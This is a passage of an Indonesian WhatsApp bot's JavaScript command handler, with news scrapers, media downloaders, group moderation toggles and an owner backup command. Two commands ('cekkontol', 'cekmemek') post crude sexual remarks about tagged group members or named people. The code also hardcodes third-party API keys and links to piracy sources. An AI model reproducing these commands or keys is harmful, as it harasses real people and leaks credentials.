"https://telegra.ph/file/dbfa4e1043d1bbc9441b2.jpg",
"https://telegra.ph/file/1ab030093aea5937e0468.jpg",
"https://telegra.ph/file/b5b64e5e5ee0df73bc5b5.jpg",
"https://telegra.ph/file/a7032cdd783d8f1656424.jpg",
"https://telegra.ph/file/5ea4218fedab8e124496b.jpg",
"https://telegra.ph/file/0e0fef10d278f886a5f4a.jpg",
"https://telegra.ph/file/09e81d73081d6f2811ca3.jpg",
"https://telegra.ph/file/816866bef7a307029e6b6.jpg",
"https://telegra.ph/file/5b5736027ae57a787d00c.jpg",
"https://telegra.ph/file/68899ab649fa4711905ce.jpg",
"https://telegra.ph/file/47b0c825cdf8ebaa90a05.jpg",
"https://telegra.ph/file/06aaa229521191de3895e.jpg",
"https://telegra.ph/file/72b973058c1985de0eda8.jpg",
"https://telegra.ph/file/72b973058c1985de0eda8.jpg"
]
const renunganx = renung[Math.floor(Math.random() * renung.length)]
Al.sendMessage(m.chat, {image: {url: renunganx}, caption: '_Renungan_'}, {quoted: m})
}
break
//========================
case 'whocogan':
case 'cogan':
case 'ganteng': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let member = participants.map(u => u.id)
let tmpn = member[Math.floor(Math.random() * member.length)]
let jawab = `*MANUSIA TAMPAN DISINI*\nYaitu @${tmpn.split('@')[0]} 😱`
let menst = [tmpn]
Al.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
//========================
case 'whocecan': 
case 'cecan':
case 'cantik': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let member = participants.map(u => u.id)
let cntikx = member[Math.floor(Math.random() * member.length)]
let jawab = `*MANUSIA CANTIK DISINI*\nYaitu @${cntikx.split('@')[0]} 😱`
let menst = [cntikx]
Al.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
//========================
case 'pelercek': 
case 'cekpeler': 
case 'kontolcek': 
case 'cekkontol': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh #1 :* ${prefix}cekkontol @Tag\n\n*Contoh #2 :* ${prefix}cekkontol Rapi Ahmad`)
const kntol = ['Item Anying', 'Hitam kontolnya', 'Gede cuk', 'Gede banget 😋', 'Lebat Bjir', 'Tu kontol apa pala rambud', 'Jumbo Bjir, pasti suka ngocok', 'Cocok diemut🗿', 'Kecil bet dah', 'Ih imut,', 'Kecil ah gak cocok', 'Mana muat ama apem para cewek🗿', 'Pasti suka ngocok', 'Hitam gelap :v', 'Lebad goblok', 'Gelap cok', 'Gak tau', 'Kamu nanya']
const konx = kntol[Math.floor(Math.random() * kntol.length)]
m.reply(`*Pertanyaan :* Cekkontol ${q}\n*Jawaban :* ${konx}`)
}
break
//========================
case 'cekapem': 
case 'apemcek': 
case 'memekcek': 
case 'cekmemek': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh #1 :* ${prefix}cekmemek @Tag\n\n*Contoh #2 :* ${prefix}cekmemek Luna Maya`)
const memk = ['Item Anying', 'Hitam memeknya', 'Pink Cuk', 'Pink banget 😋', 'Lebat Bjir', 'Tu memek apa pala rambud', 'Pink Euy🗿', 'Hitam gelap :v', 'Lebad goblok', 'Pink, Cocok tuk diodek odek', 'Gelap cok', 'Pink, perawan 😳', 'Gak tau', 'Kamu nanya']
const memx = memk[Math.floor(Math.random() * memk.length)]
m.reply(`*Pertanyaan :* Cekmemek ${q}\n*Jawaban :* ${memx}`)
}
break
//========================
case 'deleteppbot': 
case 'delppbot': 
case 'deleteppbotz': 
case 'delppbotz': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
    await Al.removeProfilePicture(botNumber)
await m.reply(`Sukses menghapus pp *${namabot}*`)
}
break
//========================
case 'sendfitur':{
if (!isCreator) return m.reply('Special For Owner Features!')
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!quoted) return m.reply(`*Tag Orangnya Terus :*\n${prefix+command} spotifys`)
if (!text) return m.reply('Nama Fitur nya bang?')
const getCase = (q) => {
return "case " + `'${q}'` + require('fs').readFileSync("AiBotzz.js").toString().split('case \''+ q +'\'')[1].split("break")[0]+"break"
} 
let t = q.split(',');
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
try{
Al.sendMessage(u, {text: `Bro, Lu dapet Kiriman Fitur Nie dari Owner gua yang baik hati dan tampan :v\n\n*TYPE :* CASE\n\n${getCase(q)}\n\nSesuai in Aja sama script lu biar nanti fitur yang gua kirim ini gak Error`})
m.reply('Fitur Berhasil Terkirim Ke Target!')
} catch (e) {
m.reply('Fitur Tidak Dapat Dikirim')
}
}
break
//========================
// INI MALAH ERROR🗿

case 'wmvideo':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
let teks = `${text}`
{
 if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await Al.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
} else {
return m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
}
break
//========================
case 'getmusic': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Example : ${prefix + command} 1`)
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) return m.reply(`Hanya Bisa Membalas Pesan Dari Bot`)
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang Anda reply tidak mengandung result ytsearch`)
await loading ()
downloadMp3(urls[text - 1])
}
break
//=================================================
case 'getvideo': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let { ytv } = require('./lib/y2mate')
if (!text) return m.reply(`Example : ${prefix + command} 1`)
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) return m.reply(`Hanya Bisa Membalas Pesan Dari Bot`)
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
Al.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `Title : ${media.title}\nFile Size : ${media.filesizeF}\nUrl : ${urls[text - 1]}\nExt : MP3\nResolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//========================
case 'db':
case 'dashboard': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
let timestamp = speed()
let latensi = speed() - timestamp
let dasbor = `
*S E R V E R - I N F O*
• *Runtime :* ${runtime(process.uptime())}
• *Platform :* Linux x64
• *Library :* Nothing
• *Run In :* Panel

*B O T - I N F O*
• *Mode :* ${Al.public ? 'Public' : 'Self'}
• *Botname :* ${namabot}
• *Version :* Not known 
• *Total Premium :* ${premium.length}
• *Total Fiture :* ${totalFitur()}
• *Prefix :* Multi Prefix
• *Baileys :* @Whiskeysockets
• *Ping :* ${latensi.toFixed(4)} ms

*M O R E - I N F O*
• *Tanggal :* ${tanggal}
• *Waktu :* ${timeWib}

*I S L A M - I N F O*
• *Ramadhan :* ${pesanHitungMundur}
• *Magrib :* ${waktuBukaPuasa}
• *Lebaran :* ${Llebaran}

Ketik .sewa Untuk Menyewa ${namabot}`
m.reply(dasbor)
} 
break
//========================
case 'fajar':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'cnn':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
if (!q) return m.reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'tribun':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'indozone':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'kompas':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'detiknews':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'daily':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'inews':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'sindo':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'antara':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "kontan":
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "merdeka":
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
Al.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "jalantikus":
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
Al.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break
//========================
case 'antivir':
case 'antivirus':
case 'antivirtex': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiVirtex) return m.reply(`_Kan udh aktif sebelumnya_`)
antivirtex.push(m.chat)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex, null, 2))
m.reply('Successfully Activated AntiVirtex')
} else if (args[0] === "off") {
if (!isAntiVirtex) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antivirtex.indexOf(m.chat)
antivirtex.splice(anu, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex, null, 2))
m.reply('Successfully Deactivation AntiVirtex')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antilinktwiter':
case 'antilinktwt':
case 'antilinktwitter': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLTwt) return m.reply(`_Kan udh aktif sebelumnya_`)
antilinktwt.push(m.chat)
fs.writeFileSync('./database/antilinktwt.json', JSON.stringify(antilinktwt, null, 2))
m.reply('Successfully Activated AntiLinkTwitter')
} else if (args[0] === "off") {
if (!isAntiLTwt) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antilinktwt.indexOf(m.chat)
antilinktwt.splice(anu, 1)
fs.writeFileSync('./database/antilinktwt.json', JSON.stringify(antilinktwt, null, 2))
m.reply('Successfully Deactivation AntiLinkTwitter')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'ytmp3': 
case 'youtubemp3': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Example : ${prefix + command} _Link nya_`)

let searchResponse = await ytdlnew(text)
Al.sendMessage(m.chat, { audio: {url: searchResponse.mp3DownloadLink}, mimetype: "audio/mp4", ptt: false},
{ quoted: floc})
}
//========================
case 'profile':
case 'me': 
case 'profil': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let cpt = `*Nama :* ${pushname}\n*Status :* ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'User'}\n*Premium :* ${isPremium ? 'Iya' : 'Tidak'}\n*Limit :* ${isPremium ? '∞' : limitPrib}/∞\n\nKamu ${isOwner ? 'Dapat' : 'Hanya dapat'} Mengakses ${isOwner ? 'Semua' : 'Beberapa'} Fitur *${namabot}* Karena Status Mu Sebagai ${isOwner ? 'Owner' : 'User Biasa'}`
let who;
try {
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender }
catch (err) {
Al.sendMessage(m.chat, {text: cpt }, {quoted: m})
}
let link = await Al.profilePictureUrl(who, 'image')
Al.sendMessage(m.chat, { image: { url: link }, caption: cpt }, {quoted: m })
}
break
//========================
case 'getname1':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (m.quoted || q) {
const namenye = await Al.getName(m.quoted.sender)
const biou = (await Al.fetchStatus(from).catch(err => console.log(chalk.redBright('[ ERROR ]'), chalk.whiteBright(err))) || {}).status || 'Bio di private!'
m.reply(`*Name :* ${namenye}\n*Bio :* ${biou}`)
} else m.reply('Tag atau reply pesan target!')
break
//========================
case 'antisfile':
case 'antilinksfile': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLSfile) return m.reply(`_Kan udh aktif sebelumnya_`)
antilinksfile.push(m.chat)
fs.writeFileSync('./database/antilinksfile.json', JSON.stringify(antilinksfile, null, 2))
m.reply('Successfully Activated AntiLinkSFile')
} else if (args[0] === "off") {
if (!isAntiLSfile) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antilinksfile.indexOf(m.chat)
antilinksfile.splice(anu, 1)
fs.writeFileSync('./database/antilinksfile.json', JSON.stringify(antilinksfile, null, 2))
m.reply('Successfully Deactivation AntiLinkSFile')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'menampilkan tutorial':
case 'tutorial': 
case 'tutor': 
case 'help': {
if (isBan) return terbanned()
let rules = `*Tutorial Penggunaan Bot :*

1. Semua Fitur Bot Bisa/Tidak Harus Juga Untuk Menggunakan Prefix Karena Bot Ini Multi Prefix.
Contoh : Ketik .allmenu
Contoh : Ketik allmenu

3. Jika Ingin Mendownload Seperti Video, Reels Fb/Ig, Story Ig, Dan Lain Sebagainya Kamu Bisa Melihat Di List Menu Download.
Contoh : Ketik .instagram _url_

4. Jika Kamu Ingin Mencari Sesuatu Kamu Bisa Lihat Di List Menu Internet, Kamu Bisa Menemukan Seperti Buka Lapak.
Contoh : Ketik .bukalapak Hoodie Kekinian

5. Jika Ingin Mengubah Ataupun Menggunakan Fitur Yang Berhubungan Dengan Media Seperti Audio, Foto, Dan Video Kamu Harus Balas Chatnya Dan Ketik Perintahnya 
Contoh Penggunaan: Balas/Reply Vn Nya Terus Ketik .tomp3

_Note: Jika Masih Tidak Mengerti Hubungin Owner Dengan Cara Mengetik .owner_
`;
	await Al.sendMessage(m.chat, { image: { url: `${global.thumb}` }, caption: rules }, {quoted: m})
}
break
//========================
case 'hapymod': 
case 'hm': 
case 'happymod': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
    if (!text) return m.reply(`Masukan Query!\n\n*Contoh :*\n${prefix + command} Minecraft`)
    let result = await happymod(text)
    let teks = result.map((v, i) => {
        return `
*${i + 1}.* ${v.name}
• Link: ${v.link}
`.trim()
    }).filter(v => v).join('\n\n\n')
    await m.reply(teks)
}
break
//========================
case 'rules':
case 'rulesbot': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let rulesnya = `*RULES* ${namabot} ${tahun}

1. No Spam
2. Jangan diculik
3. Minimal Jeda lah kalo make
4. Nyulik izin/bayar
5. Jangan Ditelpon
6. Ya pokoknya jangan spam

Simple, udah gitu doang bisa kan?`
Al.sendMessage(m.chat,{image: {url: global.thumb}, caption: rulesnya}, {quoted: m})
}
break
//========================
case 'youtube':
case 'yt':
case 'yutub': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let ytnya = `*Nie bang channel ku*
• https://youtube.com

*Syarat*
1. Es es bukti udah subscribe
2. Kirim Ke gua
3. Terus kasih caption "done" 🗿

Thanks :D`
Al.sendMessage(m.chat,{image: {url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg'}, caption: ytnya}, {quoted: m})
}
break
//========================
case 'wikimedia': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
  if (!text) return m.reply(`Mau Cari Apa?`)
  try {
  let res = await fetch(`https://api.xyroinee.xyz/api/search/wikimedia?q=${text}&apikey=${global.xyro}`)
  let anu = await res.json()
  anu = anu.data.map((v) => `*Title:* ${v.title}\n*Source:* ${v.source}\n*Image:* ${v.image}`).join`\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n`
  m.reply(anu)
  } catch (e) {
  m.reply(`Tidak Dapat Menemukan Apa Yang Kamu Cari`)
  }
  }
  break
//========================
case 'delchat': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isOwner) return m.reply('Malas Peler')
await Al.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, m.chat)
}
break
//========================
case 'clearchat':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
nimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
//========================
case 'tinyurl': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply('Link nya?')
const request = require('request')
request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, responsee, body) {
try {
m.reply(body)
} catch (err) {
m.reply(err)
}
})
}
break
//========================
case 'playstore':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (args.length == 0) return m.reply(`Example: ${prefix + command} Telegram`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/playstore?apikey=3ded02033757fbd61ff60876&query=${args[0]}`)
var caption = 'Play Store Search : \n'
for (var x of data.result) {
caption += `Name : ${x.title}\n`
caption += `ID : ${x.appId}\n`
caption += `Developer : ${x.developer}\n`
caption += `Link : ${x.url}\n`
caption += `Price : ${x.priceText}\n`
caption += `Price : ${x.price}\n\n`
}
m.reply(caption)
break
//========================
case 'antilinkdc':
case 'antilinkdiscord': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLDc) return m.reply(`_Kan udh aktif sebelumnya_`)
antilinkdc.push(m.chat)
fs.writeFileSync('./database/antilinkdc.json', JSON.stringify(antilinkdc, null, 2))
m.reply('Successfully Activated AntiLinkDiscord')
} else if (args[0] === "off") {
if (!isAntiLDc) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antilinkdc.indexOf(m.chat)
antilinkdc.splice(anu, 1)
fs.writeFileSync('./database/antilinkdc.json', JSON.stringify(antilinkdc, null, 2))
m.reply('Successfully Deactivation AntiLinkDiscord')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'jadwal': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Jadwal apa?\n\n*Example :*\n${prefix+command} seragam\n${prefix+command} pelajaran`)
if (args[0] === "seragam") {
let jdwlnya = `Berikut Jadwal Seragam Kelas 7B\n\n© ${tahun}`
Al.sendMessage(m.chat,{image: {url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg'}, caption: jdwlnya}, {quoted: fkontak})
}
if (args[0] === "pelajaran") {
let jdwlnyaa = `Berikut Jadwal Pelajaran Kelas 7B\n\n© ${tahun}`
Al.sendMessage(m.chat,{image: {url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg'}, caption: jdwlnyaa}, {quoted: fkontak})
}
}
break
//========================
case 'backup':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
m.reply('_Loading..._')
exec('zip backup.zip *')
let malas = await fs.readFileSync('./backup.zip')
await Al.sendMessage(m.chat, {
document: malas,
mimetype: 'application/zip',
fileName: 'backup.zip'
}, {quoted: m})
break
//========================
case 'getfunc':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (!q) return m.reply(`Contoh : ${prefix + command} happymod`)
const getfunc = (funcc) => {
return "const "+`'${funcc}'`+fs.readFileSync('./AiBotzz.js').toString().split('const \''+funcc+'\'')[1].split('')
}
m.reply(`${getfunc(q)}`)
break
//========================
case 'cuaca5':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
Al.sendMessage(from, { react: { text: "☁️", key: m.key } })
if (!args[0]) return m.reply("Enter your location to search weather.")
myweather = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args.join(" ")}&units=metric&appid=e409825a497a0c894d2dd975542234b0&language=tr`)
  const weathertext = `🌤 *Weather Report* 🌤\n\n🔎 *Search Location:* ${myweather.data.name}\n*💮 Country:* ${myweather.data.sys.country}\n?? *Weather:* ${myweather.data.weather[0].description}\n🌡️ *Temperature:* ${myweather.data.main.temp}°C\n❄️ *Minimum Temperature:* ${myweather.data.main.temp_min}°C\n📛 *Maximum Temperature:* ${myweather.data.main.temp_max}°C\n💦 *Humidity:* ${myweather.data.main.humidity}%\n🎐 *Wind:* ${myweather.data.wind.speed} km/h\n`
Al.sendMessage(from, { video: { url: 'https://media.tenor.com/bC57J4v11UcAAAPo/weather-sunny.mp4' }, gifPlayback: true, caption: weathertext }, { quoted: m })
break;
//========================
case 'covidinfo':
case 'covid':
